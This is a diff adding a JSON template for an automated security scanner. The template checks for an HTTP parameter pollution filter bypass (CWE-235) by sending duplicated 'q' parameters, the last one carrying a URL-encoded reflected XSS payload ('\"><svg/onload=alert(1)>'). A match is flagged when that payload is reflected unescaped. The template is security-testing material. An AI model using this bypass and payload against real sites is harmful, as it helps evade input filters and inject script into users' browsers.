@@ -1,0 +1,26 @@
+{
+  "name": "web/HTTP parameter pollution parser differential",
+  "description": "[high] Proves HPP filter bypass: duplicated q params where the first occurrence passes the filter/WAF and the LAST occurrence reaches the sink raw = parser disagreement (CWE-235), the same primitive that smuggles payloads past input filters. Keywords: hpp http parameter pollution duplicate params waf filter bypass. ctrl: single param is sanitized -> not falsified. base_url = search/echo endpoint with filterable q param.",
+  "cwe": "CWE-235",
+  "requests": {
+    "payload": {
+      "method": "GET",
+      "url": "{{base_url}}/search?q=c7hpp&q=%22%3E%3Csvg%2Fonload%3Dalert(1)%3E"
+    }
+  },
+  "conditions": [
+    {
+      "type": "reflected_unescaped",
+      "request": "payload",
+      "token": "\"><svg/onload=alert(1)>"
+    }
+  ],
+  "params": [
+    "base_url"
+  ],
+  "source": "imported",
+  "successes": 1,
+  "id": "9a4d37b8b1a0",
+  "created": "2026-11-06T04:51:35.422905+00:00",
+  "last_used": "2026-11-06T04:51:35.422905+00:00"
+}
